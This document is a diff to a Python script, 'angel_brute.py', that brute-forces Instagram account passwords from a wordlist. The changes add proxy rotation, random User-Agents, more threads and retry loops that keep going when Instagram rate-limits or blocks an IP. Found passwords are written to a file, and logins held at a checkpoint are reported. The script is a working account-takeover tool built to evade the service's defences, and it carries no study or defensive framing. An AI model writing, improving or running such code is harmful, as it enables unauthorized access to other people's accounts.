@@ -6,13 +6,15 @@ import time
 import socket
 import threading
 import traceback
+import re
+from urllib.error import HTTPError
 
 try:
     import Queue
 except ImportError:
     import queue as Queue
 
-THREAD = 4
+THREAD = 15
 
 
 
@@ -27,18 +29,6 @@ class bcolors:
     UNDERLINE = '\033[4m'
 
 
-def main(username, words):
-
-  response = rq.urlopen('http://www.instagram.com')
-  html = response.read()
-
-  csrf_token = extract_csrf_token(html)
-
-  for word in words:
-
-    password = word.strip()
-
-    craft_response(username, password, csrf_token)
 
 
 
@@ -70,7 +60,8 @@ def craft_response(username, password, csrf_token, proxy):
              "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko)",
              "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201",
              "Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0",
-             "Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))"]
+             "Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))",
+             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0"]
 
   URL = "https://www.instagram.com/accounts/login/ajax/"
 
@@ -86,8 +77,8 @@ def craft_response(username, password, csrf_token, proxy):
 
   headers = {
     "Host": "www.instagram.com",
-    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0",
-    #"User-Agent": random.choice(user_agents),
+    #"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0",
+    "User-Agent": random.choice(user_agents),
     "Accept": "*/*",
     "Accept-Language": "en-US,en;q=0.5",
     "Accept-Encoding": "gzip, deflate",
@@ -101,37 +92,105 @@ def craft_response(username, password, csrf_token, proxy):
     "Cookie": "csrf_token=" + csrf_token
   }
 
-  """
-  proxy_support = rq.ProxyHandler({'https': 'https://' + proxy})
-  opener = rq.build_opener(proxy_support)
-  rq.install_opener(opener)
-  """
+  try:
 
-  
+    if proxy is not None:
 
-  data = http_parser.urlencode(values)
-  data = data.encode('ascii')
-  req = rq.Request(URL, data, headers)
+
+      proxy_support = rq.ProxyHandler({'https': 'https://' + proxy})
+      opener = rq.build_opener(proxy_support)
+      rq.install_opener(opener)
 
 
 
-  with rq.urlopen(req) as response:
-    the_page = response.read()
 
-    #print (the_page)
+    data = http_parser.urlencode(values)
+    data = data.encode('ascii')
+    req = rq.Request(URL, data, headers)
 
-    try:
 
-      if "\"authenticated\": false" in str(the_page):
 
-        print ("Trying: " + "\"" + password + "\"" +"| FAILURE")
+    with rq.urlopen(req) as response:
+      the_page = response.read()
 
-      else:
-        print ("Success! Password is: " + password)
-        exit()
+      #print (the_page)
 
-    except Exception as err:
-      print("Error: {0}".format(err))
+
+
+    page_text = str(the_page)
+
+    if "\"authenticated\": true" in page_text:
+
+      print(bcolors.OKGREEN + "[+] Success! Password is: " + bcolors.BOLD + password + bcolors.ENDC + "\n")
+
+      f = open("success_login.txt", "w")
+      found_flag = True
+      f.write(password)
+
+      q.queue.clear()
+      q.task_done()
+      return
+
+    elif "error" in page_text:
+      # send response again
+      print ("Error in page text.." + password)
+      craft_response(username, password, csrf_token, random.choice(list(proxys_working_list.keys())))
+
+
+    else:
+      print ("Trying: " + "\"" + password + "\"" +"| FAILURE")
+
+    
+  except HTTPError as e:
+          if e.getcode() == 400 or e.getcode() == 403:
+
+              #print (str(e.read().decode("utf8", 'ignore')))
+
+              #j = open("400_error.txt", "w")
+              #j.write(str(e.read().decode("utf8", 'ignore')))
+              #j.close()
+
+              if "checkpoint_required" in e.read().decode("utf8", 'ignore'):
+                print(bcolors.OKGREEN + bcolors.BOLD + "\n[*]Successful Login "
+                        + bcolors.FAIL + "But need Checkpoint :|" + bcolors.OKGREEN)
+                print("---------------------------------------------------")
+                print("[!]Username: ", USER)
+                print("[!]Password: ", password)
+                print("---------------------------------------------------\n" + bcolors.ENDC)
+                found_flag = True
+                q.queue.clear()
+                q.task_done()
+                return
+
+              elif proxy:
+                  print(bcolors.WARNING +
+                        "[!]Error: Proxy IP %s is now on Instagram jail ,  Removing from working list !" % (proxy,)
+                        + bcolors.ENDC
+                        )
+                  if proxy in proxys_working_list:
+                      proxys_working_list.pop(proxy)
+
+                  print(bcolors.OKGREEN + "[+] Online Proxy: ", str(len(proxys_working_list)) + bcolors.ENDC)
+                  raise Exception(str(e.getcode()))
+                  
+
+
+              else:
+                  print(bcolors.FAIL + "[!]Error : Your Ip is now on Instagram jail ,"
+                        " script will not work fine until you change your ip or use proxy" + bcolors.ENDC)
+                  raise Exception(str(e.getcode()))
+          else:
+              #print("Error:", e.getcode())
+              print ("Http Error Bloc: " + str(e.getcode()))
+              raise Exception(str(e.getcode()))
+
+        
+    
+  except Exception as err:
+    print ("LINE 194: " + str(err))
+    raise Exception(str(e.getcode()))
+    
+    
 
 def encode_password(password):
 
@@ -174,7 +233,6 @@ def check_avalaible_proxys(proxys):
     """
     socket.setdefaulttimeout(30)
 
-    #global proxys_working_list
     print(bcolors.WARNING + "[-] Testing Proxy List...\n" + bcolors.ENDC)
 
     max_thread = THREAD
@@ -207,17 +265,19 @@ def check_proxy(q):
     if not q.empty():
 
         proxy = q.get(False)
-        proxy = proxy.replace("\r", "").replace("\n", "")
+        proxy = proxy.strip()
 
 
         try:
-        
-            
             
             is_working = False
 
             if not is_bad_proxy(proxy):
                 proxys_working_list.update({proxy: proxy})
+                p = open("good_proxies.txt", "a")
+                p.write(proxy + "\n")
+                p.close()
+
                 print(bcolors.OKGREEN + " --[+] ", proxy, " | PASS" + bcolors.ENDC)
 
             else:
@@ -226,11 +286,21 @@ def check_proxy(q):
             
 
         except Exception as err:
-            if _verbose:
-                print(" --[!] ", proxy, " | FAILED")
-            if _debug:
-                print(logger.error(err))
-            pass  
+            print(" --[!] ", proxy, " | FAILED | " + str(err)) 
+
+
+def has_server_error(message):
+
+  if (("403" in message) or ("429" in message) or ("onnection reset" in message)
+            or ("50" in message) or ("timed out" in message)\
+            or ("Remote end closed connection" in message)):
+    return True
+
+  else:
+    return False
+
+
+
 
 def brute(q):
     """
@@ -247,22 +317,49 @@ def brute(q):
                 proxy = random.choice(list(proxys_working_list.keys()))
 
             word = q.get()
-            word = word.replace("\r", "").replace("\n", "")
-
-            #craft request with proxy
-
-            response = rq.urlopen('http://www.instagram.com')
-            html = response.read()
-
-            csrf_token = extract_csrf_token(html)
+            word = word.replace("\r", "").replace("\n", "").strip()
 
 
-            password = word.strip()
-
-            craft_response(username, password, csrf_token, proxy)
+            craft_response(username, word, csrf_token, proxy)
 
         except Exception as error:
-          print(traceback.print_exc())
+
+          message = str(error)
+
+          #Forbidden or Too Many Requests, try again until request is accepted
+
+          print(bcolors.WARNING + "[-] Error, retrying.. " + str(error) + bcolors.ENDC)
+
+          # Look for server side error codes
+          if ("400" in message) or ("403" in message):
+            print ("400 Error, password is: " + word)
+            print (message)
+            craft_response(username, word, csrf_token, random.choice(list(proxys_working_list.keys())))
+
+
+          i = 1
+
+          while has_server_error(message):
+
+            
+
+            try:
+              print("Attempt " + str(i), end="\r", flush=True)
+              i += 1
+
+              if len(proxys_working_list) != 0:
+                proxy = random.choice(list(proxys_working_list.keys()))
+
+              craft_response(username, word, csrf_token, proxy)
+              message = "Passed"
+
+            except Exception as e:
+              message = str(e)
+              #print ("TEST: " + message)
+              #return 0
+            
+
+        
 
 
 
@@ -307,12 +404,21 @@ def starter():
 def get_csrf():
 
   global csrf_token
+  csrf_token = ""
 
 
-  response = rq.urlopen('http://www.instagram.com')
-  html = response.read()
+  #Keep making requests until a csrf token is acquired 
+  print(bcolors.WARNING + "[-] Extracting CSRF Token...\n" + bcolors.ENDC)
+  while len(csrf_token) == 0:
+    try:
 
-  csrf_token = extract_csrf_token(html)
+      response = rq.urlopen('http://www.instagram.com')
+      html = response.read()
+
+      csrf_token = extract_csrf_token(html)
+    except Exception as e:
+      #try again
+      pass
 
   print(bcolors.OKGREEN + "[+] CSRF Token :", csrf_token, "\n" + bcolors.ENDC)
 
@@ -346,12 +452,12 @@ if __name__ == "__main__":
 
   global proxys_working_list
 
-  proxys_working_list = []
+  proxys_working_list = {}
 
   # Parse args
   parser = argparse.ArgumentParser(
         description="Instagram BruteForce Script",
-        epilog="python angel_brute.py -u user_test -w words.txt"
+        epilog="python angel_brute.py -u user_test -w words.txt -p proxies.txt"
     )
 
   # required argument
@@ -359,7 +465,7 @@ if __name__ == "__main__":
                   help='Target Username')
   parser.add_argument('-w', '--word', action="store", required=True,
                   help='Words list path')
-  parser.add_argument('-p', '--proxy', action="store", required=True,
+  parser.add_argument('-p', '--proxy', action="store", required=False,
                         help='Proxy list path')
 
   args = parser.parse_args()
@@ -369,24 +475,31 @@ if __name__ == "__main__":
   username = USER
 
   try:
-      words = open(args.word).readlines()
+      #words = open(args.word).readlines()
+      words = re.findall('\w+', open(args.word, encoding='latin-1').read().lower())
   except IOError:
       print("[-] Error: Check your word list file path\n")
       sys.exit(1)
 
-  try:
-    proxies = open(args.proxy).readlines()
-  except IOError:
-      print("[-] Error: Check your proxy list file path\n")
-      sys.exit(1)
+  if args.proxy is not None:
+
+    try:
+      proxies = open(args.proxy).readlines()
+    except IOError:
+        print("[-] Error: Check your proxy list file path\n")
+        sys.exit(1)
+
+    check_avalaible_proxys(proxies)
 
 
-  #check_avalaible_proxys(proxies)
+
+
+
+  
   get_csrf()
   starter()
 
 
-  #main(USER, words)
 
 
 
